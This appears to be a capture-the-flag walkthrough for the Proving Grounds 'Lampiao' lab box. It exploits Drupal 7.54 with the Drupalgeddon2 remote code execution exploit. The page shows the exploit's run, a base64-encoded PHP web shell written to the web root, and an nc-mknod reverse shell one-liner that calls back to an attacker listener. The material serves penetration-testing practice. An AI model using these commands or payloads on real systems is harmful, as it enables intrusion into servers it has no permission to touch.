---
layout: default
title: Drupal
parent: Web Exploits
nav_order: 2
---

# Drupal

---

Example from _Proving Grounds Play - Lampiao_

Looking at _/profiles_ we see _/testing_ and several files including a _testing.info_ file.

![profiles](../../../assets/images/ctfs/proving_grounds/lampiao/profiles.png)

This indicates the version of Drupal is _7.5_

![version](../../../assets/images/ctfs/proving_grounds/lampiao/version.png)

# Exploitation

---

This version should be vulnerable to _Drupalgeddon2_ which there is an RCE exploit in _searchsploit_

![searchsploit](../../../assets/images/ctfs/proving_grounds/lampiao/searchsploit.png)

Copy the _44449.rb_ exploit to the current directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ searchsploit -m 44449.rb
  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/vagrant/Documents/PG/PLAY/lampiao/44449.rb


```

This exploit requires the _highline_ gem.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ sudo gem install highline
Fetching highline-2.1.0.gem
Successfully installed highline-2.1.0
Parsing documentation for highline-2.1.0
Installing ri documentation for highline-2.1.0
Done installing documentation for highline after 1 seconds
1 gem installed

```

Now we can run the exploit and get a reverse shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ ruby 44449.rb http://192.168.226.48:1898
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://192.168.226.48:1898/
--------------------------------------------------------------------------------
[+] Found  : http://192.168.226.48:1898/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo OXGANKQN
[+] Result : OXGANKQN
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.226.48:1898/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://192.168.226.48:1898/shell.php' -d 'c=hostname'
lampiao>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Get a Stable Shell

---

Use _revshellgen_ to generate a _nc-mknod_ reverse shell one-liner.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

```

Run this one-liner in the PHP shell on the target.

```bash
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!

lampiao>> rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l
[!] WARNING: Detected an known bad character (>)

```

We get a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.226.48] 56476
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

##
